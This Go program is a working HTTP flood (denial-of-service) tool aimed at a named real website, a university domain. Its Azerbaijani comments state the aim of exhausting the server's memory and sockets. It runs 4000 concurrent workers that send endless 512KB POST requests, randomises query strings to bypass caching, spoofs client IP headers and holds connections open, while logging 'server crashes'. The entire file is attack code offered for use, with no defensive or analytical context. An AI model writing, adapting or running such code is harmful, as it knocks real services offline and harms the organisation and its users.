package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

func main() {
	// Hədəf saytın URL-i
	target := "https://bbu.edu.az"
	// Railway resurslarını sona qədər istifadə etmək üçün
	workers := 4000 
	
	fmt.Printf("[!!!] HAKAI-FORCE AKTİVDİR: %s\n", target)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			NextProtos:         []string{"h2", "http/1.1"},
		},
		MaxIdleConns:        100000,
		MaxIdleConnsPerHost: 50000,
		// Bağlantıları açıq saxlayaraq serverin socketlərini doldururuq
		DisableKeepAlives: false, 
		IdleConnTimeout:   120 * time.Second,
	}

	client := &http.Client{Transport: tr, Timeout: 7 * time.Second}
	var successCount uint64
	var crashCount uint64

	var wg sync.WaitGroup
	// 512KB Payload - Serverin RAM-ını dərhal bitirmək üçün
	payload := "kill=" + strings.Repeat("K", 524288) 

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			for {
				// Cache bypass - Server hər sorğunu yeni sorğu kimi emal etməldir
				u := fmt.Sprintf("%s/?v=%d&z=%d", target, time.Now().UnixNano(), rand.Int())
				
				req, _ := http.NewRequest("POST", u, strings.NewReader(payload))
				
				// Realist Headers (JA3 Fingerprint imitasiyası üçün)
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0")
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", rand.Intn(255), rand.Intn(255), rand.Intn(255), rand.Intn(255)))

				resp, err := client.Do(req)
				atomic.AddUint64(&successCount, 1)

				if err == nil {
					if resp.StatusCode >= 500 {
						atomic.AddUint64(&crashCount, 1)
					}
					// Body-ni dərhal qapatmırıq ki, socket məşğul qalsın
					time.Sleep(10 * time.Millisecond)
					resp.Body.Close()
				} else {
					atomic.AddUint64(&crashCount, 1)
					time.Sleep(5 * time.Millisecond)
				}
			}
		}(i)
	}

	// Səssiz Hesabat (Railway log limitinə düşməmək üçün)
	go func() {
		for {
			time.Sleep(5 * time.Second)
			fmt.Printf("[STATUS] Göndərilən: %d | Server Çöküşü (Error): %d\n", 
				atomic.LoadUint64(&successCount), atomic.LoadUint64(&crashCount))
		}
	}()

	wg.Wait()
}
